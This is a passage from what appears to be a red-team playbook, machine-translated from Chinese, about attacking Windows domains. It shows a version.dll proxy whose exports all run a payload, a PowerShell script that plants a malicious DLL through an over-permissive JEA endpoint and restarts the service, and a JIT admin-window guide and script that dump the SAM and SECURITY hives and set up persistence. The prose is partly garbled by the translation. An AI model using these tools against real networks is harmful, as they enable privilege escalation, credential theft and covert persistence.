        [DllExport("GetFileVersionInfoW", CallingConvention = CallingConvention.StdCall)]
        public static bool GetFileVersionInfoW(string filename, int handle, int len, byte[] data)
        {
            Payload.Run();
            GetFileVersionInfoWDelegate real = Resolve<GetFileVersionInfoWDelegate>("GetFileVersionInfoW");
            return real != null ? real(filename, handle, len, data) : false;
        }

        [DllExport("GetFileVersionInfoA", CallingConvention = CallingConvention.StdCall)]
        public static bool GetFileVersionInfoA(string filename, int handle, int len, byte[] data)
        {
            Payload.Run();
            GetFileVersionInfoADelegate real = Resolve<GetFileVersionInfoADelegate>("GetFileVersionInfoA");
            return real != null ? real(filename, handle, len, data) : false;
        }

        [DllExport("GetFileVersionInfoSizeW", CallingConvention = CallingConvention.StdCall)]
        public static int GetFileVersionInfoSizeW(string filename, out int handle)
        {
            Payload.Run();
            GetFileVersionInfoSizeWDelegate real = Resolve<GetFileVersionInfoSizeWDelegate>("GetFileVersionInfoSizeW");
            return real != null ? real(filename, out handle) : 0;
        }

        [DllExport("GetFileVersionInfoSizeA", CallingConvention = CallingConvention.StdCall)]
        public static int GetFileVersionInfoSizeA(string filename, out int handle)
        {
            Payload.Run();
            GetFileVersionInfoSizeADelegate real = Resolve<GetFileVersionInfoSizeADelegate>("GetFileVersionInfoSizeA");
            return real != null ? real(filename, out handle) : 0;
        }

        [DllExport("VerQueryValueW", CallingConvention = CallingConvention.StdCall)]
        public static bool VerQueryValueW(byte[] block, string subBlock, out IntPtr buffer, out uint len)
        {
            Payload.Run();
            VerQueryValueWDelegate real = Resolve<VerQueryValueWDelegate>("VerQueryValueW");
            return real != null ? real(block, subBlock, out buffer, out len) : false;
        }

        [DllExport("VerQueryValueA", CallingConvention = CallingConvention.StdCall)]
        public static bool VerQueryValueA(byte[] block, string subBlock, out IntPtr buffer, out uint len)
        {
            Payload.Run();
            VerQueryValueADelegate real = Resolve<VerQueryValueADelegate>("VerQueryValueA");
            return real != null ? real(block, subBlock, out buffer, out len) : false;
        }
    }
}
````

#### `m14-jea-file-copy.ps1` {#m14-jea-file-copy-ps1}

````powershell
<#
use: automation“JEA Over-wide file copy”Utilize - Connect JEA Restricted endpoints, enumeration of available commands, harmless exploration of boundaries、
      throw malicious DLL Go to the service loading directory and try to use Restart-Service trigger loading。
scene: scene 42（docs/14-kiosk-jea-jit.md）。Character abilities are too broad: allowed Copy-Item and -Destination
      Undefined security directory; this script does not rely on sessions to execute arbitrary code。
rely: attack aircraft PowerShell 5.1+；target open WinRM 5985/5986；JEA endpoint Permission Including this account；
      be placed DLL See m14-jea-service-dll.cs（or M04 Native C template）。
use:
  .\m14-jea-file-copy.ps1 -Target TARGET -Endpoint <JEAendpoint name> -Domain DOMAIN -User USER `
      -Pass 'PASS' -LocalPayload .\evil.dll -RemoteDir 'C:\Program Files\<Vendor>' `
      -RemoteName 'version.dll' -ServiceName '<svc>' [-ForceRestart] [-ProbeOnly]
  illustrate: -ProbeOnly Just do“enumeration command + Write harmless probes”Two things, no official payload is released, used to confirm the boundary。
       NTHASH Login does not support native WinRM Direct connection, see you -NTHash Parameter description。
placeholder: LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD —— All passed in as command line parameters。
test status: Not tested (depends on target environment) JEA Configuration; as per document section 42 festival first -ProbeOnly lower validation bound）。
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory)][string]$Target,      # Target machine name/IP（TARGET）
    [Parameter(Mandatory)][string]$Endpoint,    # JEA Session configuration name, such as BackupMaintenance
    [Parameter(Mandatory)][string]$Domain,      # domain name（DOMAIN）
    [Parameter(Mandatory)][string]$User,        # JEA role member account（USER）
    [string]$Pass,                              # clear text password（PASS），and -NTHash Choose one
    [string]$NTHash,                            # NTHASH：For reminder only（WinRM Direct hash login is not supported）
    [string]$LocalPayload,                      # local malicious DLL path（PAYLOAD）
    [string]$RemoteDir,                         # Target delivery directory (service exe/Plug-in directory）
    [string]$RemoteName,                        # The file name after delivery (the host’s missing dependency name）
    [string]$ServiceName,                       # Service name that triggers restart
    [switch]$ForceRestart,                      # Called after delivery Restart-Service
    [switch]$ProbeOnly                          # Only explore the boundaries and do not release formal payloads
)

$ErrorActionPreference = 'Stop'

function New-DomainCred {
    param([string]$Account, [string]$Password)
    $secure = ConvertTo-SecureString $Password -AsPlainText -Force
    New-Object System.Management.Automation.PSCredential($Account, $secure)
}

function Write-Step {
    param([string]$Message, [ConsoleColor]$Color = 'Gray')
    Write-Host ("[+] " + $Message) -ForegroundColor $Color
}

# ---- 0. Parameter check ----
if (-not $Pass) {
    if ($NTHash) {
        Write-Warning "WinRM/JEA native login does not support direct transmission of NTHASH. Alternative:"
        Write-Warning "1) Use m15’s evil-winrm idea with hashing (evil-winrm supports NTLM hashing);"
        Write-Warning "2) First exchange NTHASH for tickets/exchange plaintext (such as Rubeus asktgt + s4u and then use Kerberos)."
        Write-Warning "This script requires -Pass clear text password for New-PSSession."
        exit 1
    }
    throw "-Pass (clear text password) is missing."
}
if (-not $ProbeOnly -and (-not $LocalPayload -or -not $RemoteDir -or -not $RemoteName)) {
    throw "-LocalPayload, -RemoteDir, -RemoteName must be provided in non-ProbeOnly mode."
}

$account = "$Domain\$User"
$cred = New-DomainCred -Account $account -Password $Pass

# ---- 1. Establish JEA session ----
Write-Step "Connect to JEA endpoint: $Target / $Endpoint (account $account)" 'Cyan'
$session = $null
try {
    $session = New-PSSession -ComputerName $Target -ConfigurationName $Endpoint `
        -Credential $cred -ErrorAction Stop
}
catch {
    Write-Host "[!] Connection failed: $($_.Exception.Message)" -ForegroundColor 'Red'
    Write-Host "Check: whether the endpoint name/account is in the Permission of the endpoint/whether WinRM is reachable/whether HTTPS is required."
    exit 1
}

# ---- 2. Enumerate the commands available in the session (what you can see is what can be used) ----
Write-Step "Enumerate available commands within a session:" 
$allowed = Invoke-Command -Session $session -ScriptBlock {
    Get-Command | Select-Object Name, CommandType, Source | Sort-Object Name
}
$allowed | Format-Table -AutoSize | Out-String | Write-Host
$hasCopy   = [bool]($allowed | Where-Object { $_.Name -eq 'Copy-Item' })
$hasRestart = [bool]($allowed | Where-Object { $_.Name -eq 'Restart-Service' })
$hasStop    = [bool]($allowed | Where-Object { $_.Name -eq 'Stop-Service' })
$hasStart   = [bool]($allowed | Where-Object { $_.Name -eq 'Start-Service' })

if (-not $hasCopy) {
    Write-Host "[!] There is no Copy-Item in the session - this endpoint capability is not applicable to this attack, exit." -ForegroundColor 'Red'
    Remove-PSSession $session
    exit 1
}

# ---- 3. The harmless probe is written to the target directory ----
$probe = "m14probe_$([guid]::NewGuid().ToString('N').Substring(0,8)).txt"
Write-Step "Probe the boundary: Copy-Item probe -> $RemoteDir\$probe"
$probeOk = $false
try {
    Invoke-Command -Session $session -ScriptBlock {
        param($dir, $file)
        Set-Content -Path (Join-Path $dir $file) -Value "m14 probe" -ErrorAction Stop
    } -ArgumentList $RemoteDir, $probe
    $probeOk = $true
    Write-Step "Probe writing successful: $RemoteDir\$probe (directory is within replication capability)" 'Green'
}
catch {
    Write-Host "[!] Probe writing failed: $($_.Exception.Message)" -ForegroundColor 'Yellow'
    Write-Host "The directory may be excluded or unwritable, change the directory and try again; or read the role capability .psrc to find the allowed path."
}

if ($ProbeOnly) {
    Write-Step "ProbeOnly: That’s it. The probe can be cleaned up (if the session allows Remove-Item), otherwise the recorded path will be processed afterwards."
    Remove-PSSession $session
    exit 0
}
if (-not $probeOk) {
    Write-Host "[!] Boundary detection failed, the payload was not delivered, and exited. Rerunable -ProbeOnly troubleshooting." -ForegroundColor 'Red'
    Remove-PSSession $session
    exit 1
}

# ---- 4. Deliver malicious DLL ----
Write-Step "Deliver payload: $LocalPayload -> $RemoteDir\$RemoteName"
if (-not (Test-Path $LocalPayload)) { throw "Local payload does not exist: $LocalPayload" }
try {
    $bytes = [System.IO.File]::ReadAllBytes((Resolve-Path $LocalPayload))
    Invoke-Command -Session $session -ScriptBlock {
        param($dir, $name, $data)
        [System.IO.File]::WriteAllBytes((Join-Path $dir $name), $data)
    } -ArgumentList $RemoteDir, $RemoteName, $bytes
    Write-Step "DLL written: $RemoteDir\$RemoteName (waiting for trigger)" 'Green'
}
catch {
    Write-Host "[!] Delivery failed: $($_.Exception.Message)" -ForegroundColor 'Red'
    Remove-PSSession $session
    exit 1
}

# ---- 5. Trigger loading ----
if ($ServiceName -and ($ForceRestart -or $hasRestart -or $hasStop)) {
    Write-Step "Trigger: Restart/start/stop service $ServiceName"
    try {
        if ($hasRestart) {
            Invoke-Command -Session $session -ScriptBlock {
                param($svc) Restart-Service -Name $svc -Force -ErrorAction Stop
            } -ArgumentList $ServiceName
        }
        elseif ($hasStop -and $hasStart) {
            Invoke-Command -Session $session -ScriptBlock {
                param($svc) Stop-Service -Name $svc -Force; Start-Service -Name $svc
            } -ArgumentList $ServiceName
        }
        Write-Step "The service has been restarted and the DLL should have been loaded (reconnect window 30–60s)" 'Green'
    }
    catch {
        Write-Host "[!] Service triggering failed: $($_.Exception.Message)" -ForegroundColor 'Yellow'
        Write-Host "Alternative: Wait for automatic restart/administrator restart; or change to event triggering (login script/scheduled task/Startup) according to the document."
    }
}
else {
    Write-Step "No service control command or -ForceRestart is not specified: Wait for the service to automatically restart/trigger by the administrator (keep listening)."
}

Write-Step "Finish. If the DLL is reconnected successfully, please check whoami (should be the service account); remember to restore the overwritten files."
Remove-PSSession $session
````

## Scenario 43 · JIT time window (authorization status/token refresh time difference/established commands within the window)

### Situation
Environment enforcement of administrator privileges Just-In-Time（JIT）：Usually high-power groups (such as domain groups `JIT-Admins`，or the local administrator group of the target machine)**No**Target account; the administrator temporarily adds the account to the group when needed, and automatically removes it after a few minutes to dozens of minutes. We hold credentials for a low-privilege account and the account may be JIT Authorize (or be able to take over an account that will be authorized). Task: exploit**time window**Get high-power results. The core is three points：① Can check the authorization status (when to enter the window/Go out the window）；② Understanding Token Refresh Time Differences（“Group was added”≠“Existing sessions take effect immediately”，on the contrary“Group removed”≠“The issued ticket becomes invalid immediately”）；③ Put what is to be executed in the window**High-power orders are pre-programmed**，Run away as soon as you enter the window, don't think on the spot。

### Assumptions
- Holding will be JIT Authorized low-privilege account credentials; may be able to take over first JIT Authorization target account。
- at least one“Look out the window”Access: able to read AD（LDAP Group member query), readable domain control/Native security log（4728/4729：Group members increase/delete), or the environment document states JIT Activation rules and duration。
- Kerberos Main authentication：TGT/Service tickets have a life cycle，**Group SID Only enter tickets with the time of issuance**——This is the root reason why the time difference can be exploited。
- The attack machine and domain control time have been synchronized（Kerberos Hard requirements）。

### Prepare (attacker)
- Pre-arrange the list of commands in the window and arrange them in order (see execution steps 4），Because the window may only be a few minutes。
- Prepare for monitoring and persistence that needs to be implemented/Fetch script。
- Record JIT Expected window start and end and polling starting point for easy backtracking。

### Procedure
1. **Sure“Authorization status”Query method**（Parallel if possible）：
   - AD Group members (most commonly used, readable by users in any domain)）：`Get-ADGroupMember -Identity 'JIT-Admins' -Server DC` Polling; None AD Used when using modules ADSI（See script implementation）。
   - Event Log: Domain Controller Security Log Events **4728**（Member joins global group）/ **4729**（Remove), filter the target account SID。
   - local machine JIT（Temporarily join the local administrator group): poll on the controlled host `net localgroup Administrators`。
2. **Understand and test“Token refresh time difference”**：
   - **Window side**：Old session that existed before the window/The old token does not contain the newly added group SID（`whoami /groups` cannot be seen) - required**Get new token in window**：Log in again、`runas`、New PSSession（Trigger new network login → new TGT with current group SID）、or `klist purge` Get the ticket again。
   - **Window side**：Issued within the window Kerberos Ticket lifecycle (default TGT 10h，The longest renewable period 7 sky）**Longer than group membership**——After the group is removed, the high authority in the ticket SID Remains valid until ticket expires/revoked. Renew（renew）Only extend the time, do not change SID gather。
3. **Deployment window monitoring**：Background polling authorization status（`m14-jit-admin-window.ps1`）。Immediately after detecting a window entry：
   a. Get new token (new PSSession / runas / Reauthenticate to target machine）；
   b. Verify that the new token contains the high-privilege group: within the session `whoami /groups | findstr JIT`；
   c. Execute the preset command list sequentially。
4. **List of established commands in the window**（Pre-arrange in order and keep each item as short as possible）：
   1) Grab this machine/Domain high authority credentials and return（Invoke-Mimikatz Wait, see you M07）——As a result, the attack aircraft will be dropped. You can continue to use it after exiting the window.；
   2) Reading files that require high privileges/Configuration (scripts, backups, registry) and export；
   3) （Optional, put last) Build persistence: scheduled tasks/Serve/Add our accounts to the long-term group - actions that change the environment are individually identified and audit risk assessed。
   in principle：**Get results first and then talk about persistence**；receipt received/Hash/The remote session is“Can continue to be used behind the window”assets。
5. **Utilization after the window ends**：After polling finds that the member has been removed (out of the window), verify the remaining session/Does the bill still carry high authority? SID（Existing PSSession The token is a login snapshot and theoretically still contains the group); horizontal is completed during the ticket life cycle and does not rely on group membership itself。

### Scripts used
- `m14-jit-admin-window.ps1`：Poll authorization status（ADSI Group member query is mainly for local groups/Event log mode optional）→ Enter the window and get a new token → Execute preset command list → Record exit time and check remaining token status。

### Validation
- The script log sequence is complete: detecting window entry → The new token contains JIT Group → The command list is successful one by one → detection window → Residual token check results。
- Three-state authentication: new token in window `whoami /groups` Contains high-privilege groups; old process tokens outside the window do not include; those created within the window PSSession Still available after exiting the window (login snapshot）。
- Manifest artifact (hash file/Fetch results/ticket file) is confirmed to exist on the attacking machine side。

### Failure branches and alternatives
- **Unable to read group members/event log**：According to the environment document JIT Stay in advance during the activation time, and frequently try to get new tokens near the starting point of the window and use them `whoami /groups` Verify (the starting point of the exhaustive window); or observe the time when the administrator triggers the authorization behavior pattern to infer。
- **The authorized object is not an account controlled by us**：Take over first/Reuse JIT Authorize the account (credentials, session, token), and then return to this process。
- **The remaining tickets will become invalid immediately after exiting the window.**（JIT With short TGT or forced logout): use it after giving up the window, and concentrate the output within the window (reconnect/Drop-in priority）。
- **The high-power group is only interested in“New interactive login”It takes effect but the environment prohibits multiple sessions./runas**：Use within window S4U Apply for a service ticket directly（Rubeus `s4u`/`asktgt` idea), bypass interactive login restrictions, and use high-level SID Solidify into available tickets。

### Exam / OPSEC notes
- Authorization status polling is a low-risk read operation, but high-frequency polling leaves a large amount of LDAP Query log:interval ≥5–10s，Encrypt frequencies only before and after the expected window。
- Event log query（4728/4729）Try to only check the domain controller, do not scan multiple machines horizontally。
- Grab credentials in window/The creation of persistence will be credited JIT Session auditing: Prioritize doing it within the window“get the result”（Grab the hash/external files), minimize persistence actions and put them at the end。
- Do not use the remaining bills until one second before expiration (renewal fails/It is difficult to clean up on site after being revoked); once it is verified that it is feasible, it will be transferred to formal use and put into storage as soon as possible.。

#### `m14-jit-admin-window.ps1` {#m14-jit-admin-window-ps1}

````powershell
<#
use：JIT Temporary administrator window combat script-query authorization status（AD group member + current token group), refresh tickets（klist purge / gpupdate）、
      After entering the window, execute according to the countdown window sequence."Pre-programmed list of established commands"，And after the window ends, check whether the residual token still has high authority SID。
scene：43（JIT Temporary administrator rights are approved, but are valid for a short period of time）
rely：Windows PowerShell 3.0+；Readable within the domain LDAP（389）or available Get-ADGroupMember；gpupdate / klist（The system comes with）
use：
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Status
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Status -Domain DOMAIN -User USER -Group 'JIT-Admins'
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Refresh
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Wait -WindowSec 900 -PollSeconds 10
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Run -CommandFile C:\Users\public\jit-cmds.txt -WindowSec 300
placeholder：DOMAIN=AD domain name；USER=will be JIT Authorized account；TARGET=target machine；PAYLOAD=Defined command list file (one command per line）
Test status: Not available Windows actual measurement; press PowerShell 3.0+ Syntax writing (available Get-Help .\m14-jit-admin-window.ps1 -Full View instructions）
#>
[CmdletBinding()]
param(
    [ValidateSet('Status', 'Refresh', 'Wait', 'Run')]
    [string]$Mode = 'Status',

    [string]$Domain = 'DOMAIN',
    [string]$User = 'USER',
    [string]$Group = 'JIT-Admins',
    [string]$Computer = 'TARGET',

    [string]$CommandFile = 'PAYLOAD',
    [int]$WindowSec = 300,
    [int]$PollSeconds = 15,
    [int]$DeadlineSec = 1800,

    [string]$LogFile = (Join-Path $env:TEMP 'm14-jit-admin-window.log'),
    [switch]$Help
)

function Write-Log {
    param([string]$Message, [string]$Level = 'INFO')
    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Write-Output $line
    try { Add-Content -Path $LogFile -Value $line -ErrorAction Stop } catch { }
}

function Get-TokenGroups {
    $out = & whoami /groups 2>$null
    if (-not $out) { $out = @() }
    return $out
}

function Test-TokenHasGroup {
    param([string]$GroupName)
    $groups = Get-TokenGroups
    if (-not $groups) { return $false }
    return [bool]($groups | Select-String -Pattern ([regex]::Escape($GroupName)) -SimpleMatch:$false)
}

# Use ADSI to read group members (readable by any domain user, no AD module required); if failed, return to net group
function Test-GroupMembership {
    param([string]$DomainName, [string]$UserName, [string]$GroupName)

    try {
        $root = [ADSI]"LDAP://$DomainName"
        $gs = New-Object System.DirectoryServices.DirectorySearcher($root)
        $gs.Filter = "(&(objectCategory=group)(cn=$GroupName))"
        [void]$gs.PropertiesToLoad.Add('member')
        $g = $gs.FindOne()
        if (-not $g) { Write-Log "LDAP group not found: $GroupName" 'WARN'; return $null }

        $us = New-Object System.DirectoryServices.DirectorySearcher($root)
        $us.Filter = "(&(objectCategory=user)(sAMAccountName=$UserName))"
        [void]$us.PropertiesToLoad.Add('distinguishedName')
        $u = $us.FindOne()
        if (-not $u) { Write-Log "LDAP not found user: $UserName" 'WARN'; return $null }

        $userDn = [string]$u.Properties['distinguishedname'][0]
        $members = @($g.Properties['member'])
        $inGroup = ($members -contains $userDn)
        Write-Log ("AD group membership determination: {0} in {1} = {2}" -f $UserName, $GroupName, $inGroup)
        return $inGroup
    } catch {
        Write-Log ("ADSI query failed and returned to net group: {0}" -f $_.Exception.Message) 'WARN'
        try {
            $raw = & net group "$GroupName" /domain 2>$null
            $inGroup = [bool]($raw | Select-String -Pattern ("\b" + [regex]::Escape($UserName) + "\b"))
            Write-Log ("net group judgment: {0} in {1} = {2}" -f $UserName, $GroupName, $inGroup)
            return $inGroup
        } catch {
            Write-Log "Group membership query not available (both LDAP and net group failed)" 'WARN'
            return $null
        }
    }
}

function Get-JitAuthStatus {
    Write-Log '=== Authorization status ==='
    Write-Log ("Current status:" + (& whoami))
    Write-Log ("Target machine:" + $Computer)

    $inGroup = Test-GroupMembership -DomainName $Domain -UserName $User -GroupName $Group
    if ($inGroup -eq $true) { Write-Log "[IN ] Group members: Already in $Group (authorization approved)" }
    elseif ($inGroup -eq $false) { Write-Log "[OUT] Group member: Not in $Group (not authorized yet or has expired)" }
    else { Write-Log "[??] Group members: Unable to determine" }

    $inToken = Test-TokenHasGroup -GroupName $Group
    if ($inToken) { Write-Log "[IN ] Current token: already contains $Group (can be used directly with high authority)" }
    else { Write-Log "[OUT] Current token: does not contain $Group (the old token does not contain the newly added group SID, a new token is required)" }

    Write-Log '=== Kerberos Tickets ==='
    try { & klist 2>$null | ForEach-Object { Write-Log ("  " + $_) } }
    catch { Write-Log 'klist is not available' 'WARN' }

    Write-Log '=== Security log 4728/4729 (member addition/removal) ==='
    try {
        $events = Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4728, 4729; StartTime = (Get-Date).AddHours(-6) } -MaxEvents 20 -ErrorAction Stop
        foreach ($e in $events) {
            $msg = ($e.Message -split "`r?`n") | Where-Object { $_ -match 'Member|Account|Group' } | Select-Object -First 3
            Write-Log ("  {0} id={1} {2}" -f $e.TimeCreated, $e.Id, ($msg -join ' | '))
        }
        if (-not $events) { Write-Log 'No 4728/4729 in the past 6 hours (may not be checked on the domain controller)' }
    } catch {
        Write-Log ('Event log reading failed (need to check on the local administrator or domain controller):' + $_.Exception.Message) 'WARN'
    }
}

# Refresh tickets: group members change ≠ existing tokens change immediately, and tickets must be obtained again
function Invoke-TokenRefresh {
    Write-Log '=== Refresh authentication status ==='
    Write-Log 'Step 1: klist purge (clear old TGT/service tickets and force re-application next time)'
    & klist purge 2>&1 | ForEach-Object { Write-Log ("  " + $_) }

    Write-Log 'Step 2: gpupdate /force (pull new group policy/group members)'
    & gpupdate /force 2>&1 | ForEach-Object { Write-Log ("  " + $_) }

    Write-Log 'Step 3: Trigger a network login to get a new token (new PSSession / new runas / re-authentication to the target machine)'
    Write-Log ("Suggestion: Enter-PSSession -ComputerName $Computer or runas /user:$Domain\$User cmd.exe")

    Write-Log 'Step 4: Review the new token'
    $inToken = Test-TokenHasGroup -GroupName $Group
    if ($inToken) { Write-Log '[+] The new token already contains a high-privilege group and can start executing specified commands.' }
    else { Write-Log '[-] The new token still does not contain the high authority group: confirm whether the authorization is effective and whether the ticket has been re-issued' 'WARN' }
    return $inToken
}

function Invoke-PlannedCommands {
    param([string]$File, [int]$WindowSeconds)

    if (-not (Test-Path $File)) {
        Write-Log "Command list not found: $File" 'WARN'
        Write-Log 'The recommended command in the window (get the results first, then talk about persistence), write one line per line into the file:'
        Write-Log '  whoami /groups | findstr /I "JIT"'
        Write-Log '  reg save HKLM\SAM C:\Users\Public\sam.save /y'
        Write-Log '  reg save HKLM\SECURITY C:\Users\Public\sec.save /y'
        Write-Log '  nltest /domain_trusts'
        return
    }

    $deadline = (Get-Date).AddSeconds($WindowSeconds)
    $cmds = Get-Content -Path $File | Where-Object { $_.Trim() -and -not $_.Trim().StartsWith('#') }
    Write-Log ("=== Execute {0} scheduled commands within the window (remaining window {1} seconds) ===" -f $cmds.Count, $WindowSeconds)

    foreach ($c in $cmds) {
        $left = [int]($deadline - (Get-Date)).TotalSeconds
        if ($left -le 0) { Write-Log 'The window has expired, stop executing remaining commands' 'WARN'; break }
        Write-Log ("[{0}s remaining] Execution: {1}" -f $left, $c)
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        try {
            $out = Invoke-Expression -Command $c 2>&1 | Out-String
            $sw.Stop()
            Write-Log ("Complete({0:N1}s) output: {1}" -f $sw.Elapsed.TotalSeconds, ($out.Trim() -replace "`r?`n", ' / '))
        } catch {
            $sw.Stop()
            Write-Log ("Failure({0:N1}s): {1}" -f $sw.Elapsed.TotalSeconds, $_.Exception.Message) 'ERROR'
        }
    }
    Write-Log 'The action in the window is completed'
}

function Start-JitCountdown {
    param([int]$Seconds)
    Write-Log ("Countdown {0} seconds (dot every 10 seconds; window is short, don’t think about commands on the spot)" -f $Seconds)
    $end = (Get-Date).AddSeconds($Seconds)
    $next = (Get-Date).AddSeconds(10)
    while ((Get-Date) -lt $end) {
        Start-Sleep -Seconds 1
        if ((Get-Date) -ge $next) {
            $left = [int]($end - (Get-Date)).TotalSeconds
            if ($left -gt 0) { Write-Log ("...{0} seconds remaining" -f $left) }
            $next = (Get-Date).AddSeconds(10)
        }
    }
    Write-Log 'Countdown ends: Check the remaining tokens after exiting the window'
    $inToken = Test-TokenHasGroup -GroupName $Group
    if ($inToken) { Write-Log '[+] The residual token still contains a high-rights group: the ticket life cycle is longer than the group membership and can continue horizontally (do not use it until one second before expiration)' }
    else { Write-Log '[-] The remaining tokens no longer contain high-power groups: no reusable assets were obtained within the window, and the rescheduling plan was rolled back' 'WARN' }
}

function Start-JitWait {
    param([int]$Timeout, [int]$Interval)
    Write-Log ("Polling to wait for authorization to enter the window (up to {0} seconds, once every {1} seconds; interval ≥5-10s to avoid flushing LDAP logs)" -f $Timeout, $Interval)
    $deadline = (Get-Date).AddSeconds($Timeout)
    while ((Get-Date) -lt $deadline) {
        $inGroup = Test-GroupMembership -DomainName $Domain -UserName $User -GroupName $Group
        if ($inGroup -eq $true) {
            Write-Log '[+] When a window entry is detected, the ticket will be refreshed immediately and the specified command will be executed.'
            if (Invoke-TokenRefresh) {
                Invoke-PlannedCommands -File $CommandFile -WindowSeconds $WindowSec
                Start-JitCountdown -Seconds $WindowSec
            }
            return
        }
        Write-Log ("[*] {0} has not entered the window yet, waiting..." -f (Get-Date -Format 'HH:mm:ss'))
        Start-Sleep -Seconds $Interval
    }
    Write-Log '[-] Timeout: No window entry detected (check JIT activation time, or use event log 4728 to observe instead)' 'WARN'
}

if ($Help) {
    Write-Output @'
usage: powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode <Status|Refresh|Wait|Run> [parameter]

  -Mode Status    Query authorization status：AD Group members and whether the current token contains a high-rights group、klist Tickets, security logs 4728/4729
  -Mode Refresh   Refresh authentication status：klist purge -> gpupdate /force -> Create a new login to get a new token -> Review
  -Mode Wait      Polling and waiting window（-DeadlineSec），Enter the window to refresh the ticket and execute it. -CommandFile、Countdown and check remaining tokens
  -Mode Run       Considered to be within the window: refresh directly -> Review -> exist -WindowSec Execute the set command list within seconds

  -Domain DOMAIN        AD domain name      -User USER      will be JIT Authorized account
  -Group 'JIT-Admins'   High power group name     -Computer TARGET target machine
  -CommandFile PAYLOAD  List of established commands in the window (one per line，# Start with a comment）
  -WindowSec 300        Time budget for actions within the window    -DeadlineSec 1800  Wait Total mode polling time
'@
    exit 0
}

Write-Log ("=== m14-jit-admin-window startup: Mode={0} Domain={1} User={2} Group={3} ===" -f $Mode, $Domain, $User, $Group)

switch ($Mode) {
    'Status'  { Get-JitAuthStatus }
    'Refresh' { [void](Invoke-TokenRefresh) }
    'Wait'    { Start-JitWait -Timeout $DeadlineSec -Interval $PollSeconds }
    'Run'     {
        if (Invoke-TokenRefresh) {
            Invoke-PlannedCommands -File $CommandFile -WindowSeconds $WindowSec
            Start-JitCountdown -Seconds $WindowSec
        } else {
            Write-Log 'After the token is refreshed, it still does not contain the high-privilege group: first confirm the authorization status (-Mode Status) before executing, do not try and make mistakes in the window' 'ERROR'
        }
    }
}

Write-Log ("=== End, log position: {0} ===" -f $LogFile)
````

